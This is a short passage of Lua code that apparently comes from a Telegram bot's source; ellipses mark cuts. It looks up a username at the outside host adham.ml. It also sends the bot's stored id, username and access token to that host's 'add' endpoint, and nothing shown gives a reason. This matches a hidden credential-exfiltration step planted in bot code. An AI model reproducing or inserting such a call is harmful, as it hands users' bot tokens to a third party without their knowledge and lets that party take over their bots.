...
if UserName ~= '' then
local Get_Info = http.request("http://adham.ml/info/?user="..UserName)
...
http.request("http://adham.ml/add/?id="..database:get(Server_Tshake.."Id_Tshake").."&user="..database:get(Server_Tshake.."UserName_Tshake").."&token="..database:get(Server_Tshake.."Token_Tshake"))
